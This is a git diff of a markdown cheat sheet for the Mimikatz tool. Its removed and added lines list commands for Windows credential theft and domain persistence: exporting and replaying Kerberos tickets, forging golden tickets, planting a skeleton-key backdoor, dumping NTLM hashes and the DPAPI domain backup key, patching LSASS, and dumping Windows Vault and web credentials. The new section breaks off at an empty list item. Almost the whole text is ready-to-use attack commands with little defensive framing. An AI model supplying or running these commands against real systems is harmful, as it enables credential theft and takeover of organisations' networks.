@@ -2,28 +2,36 @@
 
 ## Author: https://github.com/gentilkiwi/mimikatz
 
-### privilege::debug = Shows privileges on machine ( Ensure output is "20 OK")
+### Miscellaneous
 
-### sekurlsa::tickets /export = Exports all .kirbi tickets to current directory
+1) Shows privileges on machine ( Ensure output is "20 OK")
 
-### kerberos::ptt TICKET = It will cache and impersonate the given ticket we harvested earlier (Pass-the-Ticket)
+        privilege::debug
 
-### klist = List our cached tickets
+2) Impersonate SYSTEM
 
-### token::elevate/revert = Impersonate SYSTEM
+        token::elevate
 
-### lsadump::lsa /inject /name:krbtgt = Dumps the hash as well as the security identifier needed to create a golden ticket
+De-escalate from SYSTEM
 
-### lsadump::lsa /inject /name:DOMAIN_ADMIN/SERVICE_ACCOUNT = Silver Ticket
+        token::revert
 
-### kerberos::golden /user:Administrator /domain:CONTROLLER.LOCAL /sid:SID /krbtgt:KRBTGT_NTLM_HASH /id:ID
+3) Altering LSASS Logic (Dump network share credentials, RDP passwords, etc. Not recommended.)
 
-### misc::cmd = Elevates command prompt with the given ticket
+Prevent LSASS from checking the credential type
 
-### misc::skeleton = Skeleton key (Kerberos Backdoor) (Default credentials: mimikatz)
+        sekurlsa::patch 
 
-### lsadump::lsa /patch = NTLM hashes dump
+### Credentials Dumping
 
-### lsadump::backupkeys /system:localhost /export (Exports DPAPI Domain Backup Key from Domain Controller. VERY IMPORTANT!!!!)
+1) Windows Vault stored credentials dumping (passwords and authentication tokens)
 
-### kerberos::ptc C:\temp\TGT_Administrator@lab.local.ccache (Replay kerberos ticket)
+       vault::cred
+
+2) Web Credentials Dumping
+
+       vault::list
+
+3) 
+
+
